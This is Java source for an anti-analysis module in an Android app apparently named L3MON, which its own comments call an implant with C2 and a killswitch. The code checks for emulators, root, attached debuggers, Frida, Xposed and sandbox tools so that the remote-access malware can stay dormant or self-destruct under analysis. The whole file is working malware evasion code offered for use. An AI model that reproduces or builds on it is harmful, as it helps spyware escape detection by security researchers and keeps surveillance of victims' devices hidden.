package com.etechd.l3mon;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.os.Build;
import android.os.Debug;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

/**
 * Anti-Analysis Module for OPSEC
 * Detects emulators, root, Frida, debuggers, and other analysis environments.
 * Used to decide whether to activate full functionality or go dormant.
 */
public class AntiAnalysis {

    private static final String TAG = "L3MON-Anti";
    private static Context context;
    private static final String GENERIC = "generic";
    private static final String VBOX = "vbox";
    private static final String GOOGLE_SDK = "google_sdk";

    // Private constructor to hide the implicit public one
    private AntiAnalysis() {
        // Utility class - no instantiation
    }

    public static void init(Context ctx) {
        context = ctx;
    }

    /**
     * Main check - returns true if the environment is considered "safe" for
     * operation.
     * Returns false if analysis environment is detected (should go stealth or
     * self-destruct).
     */
    public static boolean isSafeEnvironment() {
        if (isEmulator()) {
            logDetection("Emulator detected");
            return false;
        }
        if (isRooted()) {
            logDetection("Root detected");
            return false;
        }
        if (isDebuggerAttached()) {
            logDetection("Debugger attached");
            return false;
        }
        if (isFridaDetected()) {
            logDetection("Frida detected");
            return false;
        }
        if (isRunningInSandbox()) {
            logDetection("Sandbox / Analysis environment detected");
            return false;
        }
        return true;
    }

    public static JSONObject getDetectionReport() {
        JSONObject report = new JSONObject();
        try {
            report.put("isEmulator", isEmulator());
            report.put("isRooted", isRooted());
            report.put("isDebugger", isDebuggerAttached());
            report.put("isFrida", isFridaDetected());
            report.put("isSandbox", isRunningInSandbox());
            report.put("androidVersion", Build.VERSION.SDK_INT);
            report.put("fingerprint", Build.FINGERPRINT);
            report.put("model", Build.MODEL);
            report.put("manufacturer", Build.MANUFACTURER);
            report.put("safe", isSafeEnvironment());
        } catch (Exception e) {
            android.util.Log.e(TAG, "Error generating detection report", e);
        }
        return report;
    }

    // ==================== EMULATOR DETECTION ====================

    public static boolean isEmulator() {
        try {
            return isEmulatorByFingerprint() || isEmulatorByModel() ||
                    isEmulatorByManufacturer() || hasQemuProperties() ||
                    hasEmulatorFiles() || isEmulatorByTelephony();
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean isEmulatorByFingerprint() {
        String fingerprint = Build.FINGERPRINT;
        return fingerprint.startsWith(GENERIC)
                || fingerprint.contains(VBOX)
                || fingerprint.contains("test-keys")
                || fingerprint.contains("sdk_gphone")
                || fingerprint.contains("emulator")
                || fingerprint.contains(GOOGLE_SDK);
    }

    private static boolean isEmulatorByModel() {
        String model = Build.MODEL;
        return model.contains(GOOGLE_SDK)
                || model.contains("Emulator")
                || model.contains("Android SDK built for x86")
                || model.contains("sdk")
                || model.contains("Genymotion");
    }

    private static boolean isEmulatorByManufacturer() {
        String manufacturer = Build.MANUFACTURER;
        String brand = Build.BRAND;
        String device = Build.DEVICE;
        String product = Build.PRODUCT;

        return manufacturer.contains("Genymotion")
                || brand.contains(GENERIC)
                || brand.contains("google")
                || device.contains(GENERIC)
                || product.contains("sdk");
    }

    private static boolean isEmulatorByTelephony() {
        if (context != null) {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String operator = tm.getNetworkOperatorName();
                return operator != null && (operator.toLowerCase().contains("android") || operator.equals("Android"));
            }
        }
        return false;
    }

    private static boolean hasQemuProperties() {
        String[] props = {
                "ro.kernel.qemu",
                "ro.hardware",
                "ro.product.model",
                "ro.product.name"
        };
        for (String prop : props) {
            String value = getSystemProperty(prop);
            if (value != null && (value.contains("qemu") || value.contains("goldfish") || value.contains("ranchu"))) {
                return true;
            }
        }
        return false;
    }

    private static boolean hasEmulatorFiles() {
        String[] paths = {
                "/system/lib/libc_malloc_debug_qemu.so",
                "/sys/qemu_trace",
                "/system/bin/qemu-props",
                "/dev/socket/qemud",
                "/dev/qemu_pipe"
        };
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        return false;
    }

    // ==================== ROOT DETECTION ====================
    public static boolean isRooted() {
        try {
            String[] paths = {
                    "/system/app/Superuser.apk",
                    "/sbin/su",
                    "/system/bin/su",
                    "/system/xbin/su",
                    "/data/local/xbin/su",
                    "/data/local/bin/su",
                    "/system/sd/xbin/su",
                    "/system/bin/failsafe/su",
                    "/data/local/su",
                    "/su/bin/su"
            };

            for (String path : paths) {
                if (new File(path).exists()) {
                    return true;
                }
            }

            // Check for Magisk / common root apps
            if (isPackageInstalled("com.topjohnwu.magisk") ||
                    isPackageInstalled("eu.chainfire.supersu") ||
                    isPackageInstalled("com.noshufou.android.su")) {
                return true;
            }

            // Try executing su
            if (canExecuteCommand("su")) {
                return true;
            }

            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean isPackageInstalled(String packageName) {
        try {
            if (context == null)
                return false;
            context.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean canExecuteCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(new String[] { "which", command });
            try (BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                return in.readLine() != null;
            }
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== DEBUGGER / ANALYSIS ====================
    public static boolean isDebuggerAttached() {
        try {
            return Debug.isDebuggerConnected() ||
                    (context != null && (context.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0) ||
                    Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) == 1;
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== FRIDA DETECTION ====================
    private static final String[] FRIDA_PATHS = {
            "/data/local/tmp/frida-server",
            "/data/local/tmp/re.frida.server",
            "/sdcard/frida-gadget",
            "/data/app/frida",
            "/data/local/tmp/frida"
    };

    public static boolean isFridaDetected() {
        try {
            // Check for frida-gadget / frida-server
            for (String path : FRIDA_PATHS) {
                if (new File(path).exists()) {
                    return true;
                }
            }

            // Check running processes (simple version)
            if (isFridaInProcesses()) {
                return true;
            }

            // Check for frida in maps (advanced - simplified here)
            return checkFridaInMaps();
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean isFridaInProcesses() {
        try {
            Process p = Runtime.getRuntime().exec("ps");
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.toLowerCase().contains("frida") || line.contains("gadget")) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            android.util.Log.d(TAG, "Error checking Frida in processes");
        }
        return false;
    }

    private static boolean checkFridaInMaps() {
        try {
            File maps = new File("/proc/self/maps");
            if (!maps.exists()) {
                return false;
            }

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new java.io.FileInputStream(maps)))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("frida") || line.contains("gadget") || line.contains("re.frida")) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            android.util.Log.d(TAG, "Error checking Frida in maps");
        }
        return false;
    }

    // ==================== SANDBOX / ANALYSIS TOOLS ====================
    private static final String[] SUSPICIOUS_PACKAGES = {
            "com.android.vending.billing.InAppBillingService",
            "com.saurik.substrate",
            "de.robv.android.xposed.installer",
            "com.topjohnwu.magisk",
            "org.meowcat.edxposed.manager"
    };
    private static final String XPOSED_PROPERTY = "vxp";

    public static boolean isRunningInSandbox() {
        try {
            // Check for suspicious packages
            for (String pkg : SUSPICIOUS_PACKAGES) {
                if (isPackageInstalled(pkg)) {
                    return true;
                }
            }

            // Check for Xposed / EdXposed
            return System.getProperty(XPOSED_PROPERTY) != null;
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== UTILS ====================
    private static String getSystemProperty(String propName) {
        try {
            Process p = Runtime.getRuntime().exec("getprop " + propName);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                return reader.readLine();
            }
        } catch (Exception e) {
            return null;
        }
    }

    private static void logDetection(String reason) {
        android.util.Log.w(TAG, "Analysis environment detected: " + reason);
        // In real implant, you could send this to C2 or trigger killswitch
    }

    /**
     * Convenience method - can be called from ConnectionManager on startup.
     */
    public static boolean shouldActivate() {
        return isSafeEnvironment();
    }
}